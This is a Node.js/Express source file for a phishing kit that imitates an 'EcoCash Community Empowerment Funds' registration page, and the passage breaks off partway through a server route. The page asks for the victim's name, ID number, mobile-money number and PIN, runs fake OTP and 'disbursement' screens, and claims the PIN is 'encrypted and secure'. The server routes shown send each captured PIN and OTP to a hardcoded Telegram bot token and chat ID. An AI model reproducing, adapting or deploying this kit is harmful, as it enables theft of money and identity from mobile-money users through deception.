const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CONFIGURATION - BOT 1 =====
const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== HTML PAGE =====
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0047AB 0%,#003380 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:35px 28px;max-width:440px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#0047AB;color:white;padding:8px 20px;font-size:11px;font-weight:bold;border-bottom-left-radius:12px;letter-spacing:1px}
.logo-area{text-align:center;margin-bottom:25px}
.logo-area .logo{width:70px;height:70px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;color:white;font-weight:bold;box-shadow:0 8px 20px rgba(0,71,171,0.3)}
.logo-area h1{color:#0047AB;font-size:1.6em;margin:0;font-weight:bold}
.logo-area .tagline{color:#666;margin-top:6px;font-size:0.9em}
.community-badge{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;padding:10px;border-radius:10px;text-align:center;font-size:12px;font-weight:bold;margin-bottom:20px;letter-spacing:0.5px}
.progress-bar{display:flex;justify-content:space-between;margin-bottom:25px;gap:6px}
.progress-step{flex:1;height:5px;background:#e0e0e0;border-radius:3px;transition:all 0.3s}
.progress-step.active{background:#0047AB}
.progress-step.completed{background:#28a745}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:7px;color:#333;font-weight:600;font-size:13px}
.form-group label .required{color:#f44336}
.form-group input,.form-group select{width:100%;padding:14px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:all 0.3s;background:#fafafa;font-family:inherit}
.form-group input:focus,.form-group select:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.1)}
.form-group input::placeholder{color:#bbb}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;transition:all 0.3s;color:white;background:linear-gradient(135deg,#0047AB,#0066CC);margin-top:8px}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,71,171,0.4)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-green:hover:not(:disabled){box-shadow:0 8px 25px rgba(40,167,69,0.4)}
.message{padding:14px;border-radius:10px;margin-top:15px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
.loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.otp-container{display:flex;gap:10px;justify-content:center;margin:25px 0}
.otp-input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #e0e0e0;border-radius:10px;background:#fafafa;transition:all 0.3s}
.otp-input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 3px rgba(0,71,171,0.15)}
.otp-input.filled{border-color:#0047AB;background:#f0f6ff}
.sms-sent-container{text-align:center;padding:30px 15px}
.sms-icon{width:80px;height:80px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:38px;color:white;animation:pulseSms 1.5s ease-in-out infinite;box-shadow:0 8px 25px rgba(0,71,171,0.35)}
@keyframes pulseSms{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:0.9}}
.sms-sent-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px}
.sms-sent-container p{color:#666;font-size:14px;line-height:1.6;margin-bottom:15px}
.sms-sent-container .phone-highlight{color:#0047AB;font-weight:bold}
.countdown-circle{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#0047AB,#0066CC);display:flex;align-items:center;justify-content:center;margin:25px auto;color:white;font-size:38px;font-weight:bold;box-shadow:0 10px 30px rgba(0,71,171,0.4);animation:pulseCountdown 1s ease-in-out infinite}
@keyframes pulseCountdown{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
.countdown-text{font-size:13px;color:#999;margin-top:10px}
.sms-progress-bar{width:100%;height:6px;background:#e0e0e0;border-radius:3px;margin:20px 0;overflow:hidden}
.sms-progress-fill{height:100%;background:linear-gradient(135deg,#0047AB,#0066CC);width:0%;transition:width 1s linear}
.purpose-title{text-align:center;margin-bottom:15px}
.purpose-title h2{color:#0047AB;font-size:1.3em;margin-bottom:6px}
.purpose-title p{color:#666;font-size:13px}
.purpose-list{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}
.purpose-item{border:2px solid #e0e0e0;border-radius:12px;padding:14px 10px;text-align:center;cursor:pointer;transition:all 0.3s;background:#fafafa;font-size:12px;font-weight:600;color:#555}
.purpose-item:hover{border-color:#0047AB;background:#f0f6ff;transform:translateY(-2px)}
.purpose-item.selected{border-color:#0047AB;background:linear-gradient(135deg,#0047AB,#0066CC);color:white;box-shadow:0 5px 15px rgba(0,71,171,0.3)}
.purpose-item .icon{font-size:22px;display:block;margin-bottom:5px}
.details-box{background:#f8f9fa;border-radius:12px;padding:18px;margin:20px 0;text-align:left}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e9ecef;font-size:13px}
.detail-row:last-child{border-bottom:none}
.detail-label{color:#666;font-weight:500}
.detail-value{color:#333;font-weight:600}
.status-pending{display:inline-block;padding:8px 22px;border-radius:20px;font-size:13px;font-weight:bold;background:#fff3cd;color:#856404;margin-top:10px;animation:pulseStatus 1.5s ease-in-out infinite}
@keyframes pulseStatus{0%,100%{opacity:1}50%{opacity:0.7}}
.status-progress{display:inline-block;padding:8px 22px;border-radius:20px;font-size:13px;font-weight:bold;background:#cfe2ff;color:#084298;margin-top:10px;animation:pulseStatus 1.5s ease-in-out infinite}
.step-content{display:none}
.step-content.active{display:block;animation:slideIn 0.4s ease-out}
@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
.info-note{background:#e3f2fd;border-left:3px solid #0047AB;padding:12px;border-radius:6px;font-size:12px;color:#0c5460;margin-bottom:18px;line-height:1.5}
/* PROCESSING SCREEN */
.processing-container{text-align:center;padding:25px 0}
.processing-container h2{color:#0047AB;font-size:1.4em;margin-bottom:10px}
.processing-container p{color:#666;font-size:13px;margin-bottom:20px}
.big-spinner{width:80px;height:80px;margin:20px auto;border-radius:50%;border:6px solid #e0e0e0;border-top-color:#0047AB;animation:spin 1s linear infinite}
.processing-steps{text-align:left;margin:25px 0;padding:0;list-style:none}
.processing-step-item{display:flex;align-items:center;gap:12px;padding:14px;background:#f8f9fa;border-radius:10px;margin-bottom:10px;transition:all 0.5s;opacity:0.4;border-left:4px solid transparent}
.processing-step-item.active{opacity:1;background:#e8f5e9;border-left-color:#4CAF50}
.processing-step-item.completed{opacity:1;background:#d4edda;border-left-color:#28a745}
.processing-step-item .picon{font-size:20px;width:30px;text-align:center}
.processing-step-item .ptext{flex:1;font-size:13px;font-weight:600;color:#333}
.processing-step-item .pstatus{font-size:16px}
.step-timer{font-size:12px;color:#999;font-weight:normal;display:block;margin-top:2px}
/* SUCCESS FINAL */
.success-container{text-align:center;padding:20px 0}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;font-size:56px;color:white;animation:bounce 1s;box-shadow:0 10px 30px rgba(40,167,69,0.3)}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.success-container h1{color:#28a745;margin-bottom:10px;font-size:1.6em}
.success-container p{color:#666;margin-bottom:15px;line-height:1.6;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">ECOCASH</div>

<div class="logo-area">
<div class="logo">E</div>
<h1>EcoCash</h1>
<div class="tagline">Community Empowerment Funds</div>
</div>

<div class="community-badge">🌟 POWERED BY ECOCASH • COMMUNITY EMPOWERMENT FUNDS 🌟</div>

<div class="progress-bar">
<div class="progress-step active" id="step1Bar"></div>
<div class="progress-step" id="step2Bar"></div>
<div class="progress-step" id="step3Bar"></div>
<div class="progress-step" id="step4Bar"></div>
</div>

<!-- STEP 1: REGISTRATION -->
<div class="step-content active" id="step1Content">
<form id="registerForm">
<div class="form-group">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="fullName" placeholder="Enter your full name" required autocomplete="name">
</div>
<div class="form-group">
<label>ID Number <span class="required">*</span></label>
<input type="text" id="idNumber" placeholder="Enter your ID number" required autocomplete="off">
</div>
<div class="form-group">
<label>EcoCash Number <span class="required">*</span></label>
<input type="tel" id="ecocashNumber" placeholder="0771234567" pattern="[0-9]*" inputmode="numeric" required autocomplete="tel">
</div>
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
</div>
<button type="submit" class="btn" id="submitBtn"><span id="submitText">Continue</span></button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<!-- STEP 2: SMS COUNTDOWN -->
<div class="step-content" id="step2Content">
<div class="sms-sent-container">
<div class="sms-icon">📩</div>
<h2>SMS OTP Sent</h2>
<p>An OTP has been sent to your EcoCash number<br><span class="phone-highlight" id="sentPhone">---</span></p>
<div class="countdown-circle" id="countdownCircle">10</div>
<div class="countdown-text">Please wait while we prepare your verification</div>
<div class="sms-progress-bar"><div class="sms-progress-fill" id="smsProgress"></div></div>
</div>
</div>

<!-- STEP 3: OTP INPUT -->
<div class="step-content" id="step3Content">
<div style="text-align:center;margin-bottom:15px">
<h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Enter OTP</h2>
<p style="color:#666;font-size:13px">Enter the 6-digit code sent to your phone</p>
</div>
<div class="info-note">💡 Check your SMS inbox for the 6-digit verification code.</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
</div>
<button type="button" class="btn btn-green" id="verifyOtpBtn">Verify OTP</button>
<div id="otpMessage" class="message"></div>
</div>

<!-- STEP 4: PURPOSE SELECTION -->
<div class="step-content" id="step4Content">
<div class="purpose-title">
<h2>Purpose of Funds</h2>
<p>Select the purpose for these funds</p>
</div>
<div class="info-note">💡 Choose the reason you are receiving these funds. The amount disbursed will be based on the purpose and document verification.</div>
<div class="purpose-list" id="purposeList">
<div class="purpose-item" data-value="School Fees"><span class="icon">🎓</span>School Fees</div>
<div class="purpose-item" data-value="Business Capital"><span class="icon">💼</span>Business Capital</div>
<div class="purpose-item" data-value="Rent"><span class="icon">🏠</span>Rent</div>
<div class="purpose-item" data-value="Medical Expenses"><span class="icon">🏥</span>Medical Expenses</div>
<div class="purpose-item" data-value="Groceries"><span class="icon">🛒</span>Groceries</div>
<div class="purpose-item" data-value="Transport"><span class="icon">🚗</span>Transport</div>
<div class="purpose-item" data-value="Utilities"><span class="icon">💡</span>Utilities</div>
<div class="purpose-item" data-value="Agriculture"><span class="icon">🌾</span>Agriculture</div>
<div class="purpose-item" data-value="Emergency"><span class="icon">🚨</span>Emergency</div>
<div class="purpose-item" data-value="Savings"><span class="icon">💰</span>Savings</div>
<div class="purpose-item" data-value="Funeral"><span class="icon">⚱️</span>Funeral</div>
<div class="purpose-item" data-value="Other"><span class="icon">📝</span>Other</div>
</div>
<button type="button" class="btn" id="purposeBtn" disabled>Continue</button>
<div id="purposeMessage" class="message"></div>
</div>

<!-- STEP 5: PIN CONFIRM -->
<div class="step-content" id="step5Content">
<div style="text-align:center;margin-bottom:15px">
<h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Confirm with PIN</h2>
<p style="color:#666;font-size:13px">Enter your EcoCash PIN to authorize this transaction</p>
</div>
<div class="info-note">🔒 Your PIN is encrypted and secure.</div>
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="confirmPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
</div>
<button type="button" class="btn btn-green" id="confirmPinBtn">Verify PIN</button>
<div id="pinMessage" class="message"></div>
</div>

<!-- STEP 6: PROCESSING (VERIFYING TO DISBURSEMENT - 20 SEC EACH) -->
<div class="step-content" id="step6Content">
<div class="processing-container">
<h2>Processing Your Application</h2>
<p>Please wait while we verify and process your funds...</p>
<div class="big-spinner"></div>
<ul class="processing-steps">
<li class="processing-step-item" id="pStep1">
<span class="picon">🔍</span>
<span class="ptext">Verifying Details<span class="step-timer" id="timer1"></span></span>
<span class="pstatus" id="pStatus1">⏳</span>
</li>
<li class="processing-step-item" id="pStep2">
<span class="picon">📄</span>
<span class="ptext">Document Verification<span class="step-timer" id="timer2"></span></span>
<span class="pstatus" id="pStatus2">⏳</span>
</li>
<li class="processing-step-item" id="pStep3">
<span class="picon">💵</span>
<span class="ptext">Calculating Disbursement<span class="step-timer" id="timer3"></span></span>
<span class="pstatus" id="pStatus3">⏳</span>
</li>
<li class="processing-step-item" id="pStep4">
<span class="picon">🏦</span>
<span class="ptext">Disbursement in Progress<span class="step-timer" id="timer4"></span></span>
<span class="pstatus" id="pStatus4">⏳</span>
</li>
</ul>
</div>
</div>

<!-- STEP 7: FINAL SUCCESS -->
<div class="step-content" id="step7Content">
<div class="success-container">
<div class="success-icon">✓</div>
<h1>Registration Complete!</h1>
<p>Your application has been successfully submitted.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="finalRegId">#----</span></div>
<div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="finalName">---</span></div>
<div class="detail-row"><span class="detail-label">EcoCash Number</span><span class="detail-value" id="finalPhone">---</span></div>
<div class="detail-row"><span class="detail-label">Purpose</span><span class="detail-value" id="finalPurpose">---</span></div>
<div class="detail-row"><span class="detail-label">Status</span><span class="detail-value"><span class="status-progress">💵 Disbursement in Progress</span></span></div>
</div>
<p style="margin-top:15px;font-size:13px;color:#999">Funds will be disbursed to your EcoCash account based on purpose and document verification.</p>
</div>
</div>

</div>

<script>
var currentAppId = null;
var currentOtp = null;
var currentOtp2 = null;
var selectedPurpose = '';
var countdownInterval = null;

// ===== STEP 1: SUBMIT FORM =====
document.getElementById('registerForm').addEventListener('submit', async function(e){
e.preventDefault();
var fullName=document.getElementById('fullName').value.trim();
var idNumber=document.getElementById('idNumber').value.trim();
var ecocashNumber=document.getElementById('ecocashNumber').value.trim();
var ecoPin=document.getElementById('ecoPin').value.trim();

if(!fullName){showMessage('Please enter your full name','error');return}
if(!idNumber){showMessage('Please enter your ID number','error');return}
if(!ecocashNumber||ecocashNumber.length<10){showMessage('Please enter a valid EcoCash number','error');return}
if(!ecoPin||ecoPin.length!==4){showMessage('EcoCash PIN must be 4 digits','error');return}

var btn=document.getElementById('submitBtn');
var btnText=document.getElementById('submitText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

try{
var response=await fetch('/api/register',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({fullName:fullName,idNumber:idNumber,ecocashNumber:ecocashNumber,ecoPin:ecoPin})
});
var data=await response.json();
if(data.success){
currentAppId=data.registrationId;
currentOtp=data.otp;

goToStep(2);
document.getElementById('sentPhone').textContent=ecocashNumber;
startCountdown();

// Notify server to send OTP to Telegram
fetch('/api/otp-sent',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId})
});
}else{
showMessage(data.message||'Registration failed','error');
btn.disabled=false;
btnText.textContent='Continue';
}
}catch(error){
console.error('Error:',error);
showMessage('Network error. Please try again.','error');
btn.disabled=false;
btnText.textContent='Continue';
}
});

// ===== NAVIGATION =====
function goToStep(step){
document.querySelectorAll('.step-content').forEach(function(el){el.classList.remove('active')});
document.getElementById('step'+step+'Content').classList.add('active');
for(var i=1;i<=4;i++){
var bar=document.getElementById('step'+i+'Bar');
if(bar){
bar.classList.remove('active','completed');
if(i<Math.min(step,4)){bar.classList.add('completed')}
else if(i===Math.min(step,4)){bar.classList.add('active')}
}
}
}

// ===== COUNTDOWN (10 sec for SMS) =====
function startCountdown(){
var seconds=10;
var circle=document.getElementById('countdownCircle');
var progress=document.getElementById('smsProgress');
var totalTime=10;
circle.textContent=seconds;
progress.style.width='0%';

countdownInterval=setInterval(function(){
seconds--;
circle.textContent=seconds;
var percent=((totalTime-seconds)/totalTime)*100;
progress.style.width=percent+'%';

if(seconds<=0){
clearInterval(countdownInterval);
goToStep(3);
document.querySelector('#otpContainer .otp-input').focus();
}
},1000);
}

// ===== OTP INPUTS =====
setupOtpInputs('otpContainer');

function setupOtpInputs(containerId){
var inputs=document.querySelectorAll('#'+containerId+' .otp-input');
inputs.forEach(function(input,index){
input.addEventListener('input',function(e){
var value=e.target.value.replace(/\\D/g,'');
e.target.value=value;
if(value){
e.target.classList.add('filled');
if(index<inputs.length-1){inputs[index+1].focus()}
}else{
e.target.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!e.target.value&&index>0){inputs[index-1].focus()}
});
});
}

// ===== VERIFY OTP 1 =====
document.getElementById('verifyOtpBtn').addEventListener('click',async function(){
var otp='';
document.querySelectorAll('#otpContainer .otp-input').forEach(function(input){otp+=input.value});

if(otp.length!==6){
showOtpMessage('Please enter the complete 6-digit OTP','error');
return;
}

var btn=document.getElementById('verifyOtpBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/verify-otp',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,otp:otp})
});
var data=await response.json();
if(data.success){
goToStep(4);
}else{
showOtpMessage(data.message||'Invalid OTP. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
}catch(error){
console.error('Error:',error);
showOtpMessage('Network error. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify OTP';
}
});

// ===== PURPOSE SELECTION =====
document.querySelectorAll('.purpose-item').forEach(function(item){
item.addEventListener('click',function(){
document.querySelectorAll('.purpose-item').forEach(function(el){el.classList.remove('selected')});
item.classList.add('selected');
selectedPurpose=item.getAttribute('data-value');
document.getElementById('purposeBtn').disabled=false;
});
});

document.getElementById('purposeBtn').addEventListener('click',function(){
if(!selectedPurpose){
showPurposeMessage('Please select a purpose','error');
return;
}
fetch('/api/update-purpose',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,purpose:selectedPurpose})
}).then(function(){
goToStep(5);
});
});

// ===== CONFIRM PIN =====
document.getElementById('confirmPinBtn').addEventListener('click',async function(){
var pin=document.getElementById('confirmPin').value.trim();
if(!pin||pin.length!==4){
showPinMessage('Please enter your 4-digit EcoCash PIN','error');
return;
}

var btn=document.getElementById('confirmPinBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/confirm-pin',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,pin:pin,purpose:selectedPurpose})
});
var data=await response.json();
if(data.success){
// Move to processing screen with 4 steps x 20 seconds each
goToStep(6);
runProcessingSteps();
}else{
showPinMessage(data.message||'Invalid PIN. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify PIN';
}
}catch(error){
console.error('Error:',error);
showPinMessage('Network error. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify PIN';
}
});

// ===== PROCESSING STEPS (20 seconds each) =====
function runProcessingSteps(){
var steps=['pStep1','pStep2','pStep3','pStep4'];
var timers=['timer1','timer2','timer3','timer4'];
var statuses=['pStatus1','pStatus2','pStatus3','pStatus4'];
var currentStep=0;
var stepDuration=20;

function processStep(){
if(currentStep>=steps.length){
// All done - notify server & show final
fetch('/api/disbursement-complete',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId})
});
setTimeout(function(){
document.getElementById('finalRegId').textContent='#'+currentAppId;
document.getElementById('finalName').textContent=document.getElementById('fullName').value;
document.getElementById('finalPhone').textContent=document.getElementById('ecocashNumber').value;
document.getElementById('finalPurpose').textContent=selectedPurpose;
goToStep(7);
},500);
return;
}

var stepEl=document.getElementById(steps[currentStep]);
var timerEl=document.getElementById(timers[currentStep]);
var statusEl=document.getElementById(statuses[currentStep]);

stepEl.classList.add('active');
var secondsLeft=stepDuration;
timerEl.textContent=' ('+secondsLeft+'s)';

var interval=setInterval(function(){
secondsLeft--;
timerEl.textContent=' ('+secondsLeft+'s)';
if(secondsLeft<=0){
clearInterval(interval);
stepEl.classList.remove('active');
stepEl.classList.add('completed');
statusEl.textContent='✅';
timerEl.textContent='';
currentStep++;
setTimeout(processStep,300);
}
},1000);
}

processStep();
}

// ===== UTILITY =====
function showMessage(t,ty){var d=document.getElementById('messageDiv');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showOtpMessage(t,ty){var d=document.getElementById('otpMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showPurposeMessage(t,ty){var d=document.getElementById('purposeMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showPinMessage(t,ty){var d=document.getElementById('pinMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}

// ===== INPUT =====
document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
</script>
</body>
</html>`;

// ===== ROUTES =====
app.get('/', (req, res) => {
    res.send(HTML_PAGE);
});

// ===== STORAGE =====
const pendingRegistrations = {};

// ===== API: REGISTER (First notification - details only, no OTP) =====
app.post('/api/register', async (req, res) => {
    try {
        const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;

        if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
            return res.status(400).json({ success: false, message: 'All fields are required' });
        }

        if (ecoPin.length !== 4) {
            return res.status(400).json({ success: false, message: 'EcoCash PIN must be 4 digits' });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        pendingRegistrations[registrationId] = {
            fullName, idNumber, ecocashNumber, ecoPin, otp,
            verified: false, otp1Sent: false,
            timestamp: new Date().toISOString()
        };

        // ===== FIRST NOTIFICATION: DETAILS ONLY =====
        const message =
            '💚 <b>NEW ECOCASH REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN (Initial):</b> <code>' + ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>User is on countdown. OTP will be sent shortly...</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, registrationId, otp, message: 'Registration successful' });

    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
        res.status(500).json({ success: false, message: 'Failed to process registration' });
    }
});

// ===== API: OTP SENT =====
app.post('/api/otp-sent', async (req, res) => {
    try {
        const { registrationId } = req.body;
        const registration = pendingRegistrations[registrationId];

        if (!registration) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        if (registration.otp1Sent) {
            return res.json({ success: true, message: 'OTP already sent' });
        }

        registration.otp1Sent = true;

        const message =
            '📩 <b>OTP 1 SENT TO APPLICANT</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '🔐 <b>OTP Code (Step 1):</b> <code>' + registration.otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>Waiting for user to enter OTP...</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, message: 'OTP sent' });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to send OTP' });
    }
});

// ===== API: VERIFY OTP 1 =====
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { registrationId, otp } = req.body;
        const registration = pendingRegistrations[registrationId];

        if (!registration) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        if (registration.otp !== otp) {
            const wrongMessage =
                '⚠️ <b>WRONG OTP (Step 1)</b>\n\n' +
                '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
                '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
                '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
                '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
                '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
                '🔑 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
                '✅ <b>Correct OTP:</b> <code>' + registration.otp + '</code>';
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await axios.post(url, { chat_id: CHAT_ID, text: wrongMessage, parse_mode: 'HTML' });
            return res.status(400).json({ success: false, message: 'Invalid OTP. Please try again.' });
        }

        registration.otp1Verified = true;

        const msg =
            '✅ <b>OTP 1 VERIFIED</b>\n\n' +
            '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
            '🔐 <b>OTP 1:</b> <code>' + otp + '</code>\n\n' +
            '📋 <i>User is now selecting purpose of funds...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });

        res.json({ success: true, message: 'OTP verified' });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to verify OTP' });
    }
});

// ===== API: UPDATE PURPOSE =====
app.post('/api/update-purpose', async (req, res) => {
    try {
        const { registrationId, purpose } = req.body;
        const registration = pendingRegistrations[registrationId];

        if (!registration) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        registration.purpose = purpose;

        const msg =
            '📋 <b>PURPOSE OF FUNDS SELECTED</b>\n\n' +
            '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
            '📌 <b>Purpose:</b> ' + purpose + '\n\n' +
            '⏳ <i>User is now confirming with PIN...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });

        res.json({ success: true, message: 'Purpose updated' });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to update purpose' });
    }
});

// ===== API: CONFIRM PIN (with FULL details in notification) =====
app.post('/api/confirm-pin', async (req, res) => {
    try {
        const { registrationId, pin, purpose } = req.body;
        const registration = pendingRegistrations[registrationId];

        if (!registration) {
